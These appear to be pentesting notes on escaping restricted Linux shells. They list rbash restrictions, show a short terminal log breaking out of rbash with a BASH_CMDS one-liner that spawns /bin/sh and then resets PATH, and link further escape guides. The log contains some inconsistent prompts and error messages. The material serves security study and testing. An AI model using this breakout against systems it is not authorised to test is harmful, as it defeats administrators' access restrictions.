Jailed Shell Escape

There is a lot of different restricted shells to choose from. Some of them are just normal shells with some simple common restrictions not actually configurable, such as rbash (restricited Bash), rzsh and rksh (Korn Shell in restricted mode), which are really trivial to bypass. Others have a complete configuration set that can be redesigned to fit administrator’s needs such as lshell (Limited Shell) and rssh (Restricted Secure Shell).

A Restricted Shell... What Is It?

It limits a user's ability and only allows them to perform a subset of system commands. Typically, a combination of some or all of the following restrictions are imposed by a restricted shell:

    Using the 'cd' command to change directories.
    Setting or unsetting certain environment variables (i.e. SHELL, PATH, etc...).
    Specifying command names that contain slashes.
    Specifying a filename containing a slash as an argument to the '.' built-in command.
    Specifying a filename containing a slash as an argument to the '-p' option to the 'hash' built-in command.
    Importing function definitions from the shell environment at startup.
    Parsing the value of SHELLOPTS from the shell environment at startup.
    Redirecting output using the '>', '>|', ", '>&', '&>', and '>>' redirection operators.
    Using the 'exec' built-in to replace the shell with another command.
    Adding or deleting built-in commands with the '-f' and '-d' options to the enable built-in.
    Using the 'enable' built-in command to enable disabled shell built-ins.
    Specifying the '-p' option to the 'command' built-in.
    Turning off restricted mode with 'set +r' or 'set +o restricted'.
    
    Restrictions Implemented in rbash

    cd command (Change Directory)
    PATH (setting/ unsetting)
    ENV aka BASH_ENV (Environment Setting/ unsetting)
    Importing Function
    Specifying file name containing argument ‘/’
    Specifying file name containing argument ‘-‘
    Redirecting output using ‘>‘, ‘>>‘, ‘>|‘, ‘<>‘, ‘>&‘, ‘&>‘
    turning off restriction using ‘set +r‘ or ‘set +o‘
https://www.tecmint.com/rbash-a-restricted-bash-shell-explained-with-practical-examples/
    
    https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/ 
    
    
A way escape rbash
2018-02-16 / views: 302

hacker@beta:~$ ls
-rbash: /usr/bin/python: restricted: cannot specify `/' in command names
ryuu@beta:~$ 
hacker@beta:~$ whoami
-rbash: /usr/bin/python: restricted: cannot specify `/' in command names

hacker@beta:~$ BASH_CMDS[a]=/bin/sh;a 

$ /bin/bash
bash: groups: command not found
hacker@beta:~$ export PATH=$PATH:/bin/
hacker@beta:~$ export PATH=$PATH:/usr/bin
    https://hk.saowen.com/a/fdc328ee0d838a7a3598aa5c462528baed2059e624dcda633b736a3b0337223c 
    
    http://netsec.ws/?p=337
    https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells
    https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells
    http://airnesstheman.blogspot.ca/2011/05/breaking-out-of-jail-restricted-shell.html
    http://securebean.blogspot.ca/2014/05/escaping-restricted-shell_3.html
    https://github.com/infodox/python-pty-shells
    https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells
